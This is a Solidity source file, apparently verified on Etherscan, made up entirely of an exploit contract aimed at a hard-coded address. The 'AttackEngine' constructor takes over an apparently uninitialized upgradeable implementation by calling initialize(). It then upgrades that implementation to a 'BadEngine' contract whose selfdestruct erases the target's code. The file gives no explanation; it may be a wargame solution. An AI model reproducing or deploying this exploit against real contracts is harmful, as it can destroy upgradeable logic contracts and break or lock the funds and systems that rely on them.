/**
 *Submitted for verification at Etherscan.io on 2022-11-21
*/

pragma solidity ^0.8.0;


contract BadEngine {
    function destroy() public {
        selfdestruct(payable(msg.sender));
    }
}


contract AttackEngine {
    constructor() {
        address origin = address(0x2C3DfA3c8a1bd3ae6eB40986ccD9e0Affe530C89);
        (bool success,) = origin.call(abi.encodeWithSignature("initialize()"));
        require(success, "call initialize failed");

        address engine = address(new BadEngine());
        (success, ) = origin.call(abi.encodeWithSignature("upgradeToAndCall(address,bytes)", engine, abi.encodeWithSignature("destroy()")));
        require(success, "call upgradeToAndCall failed");
    }
}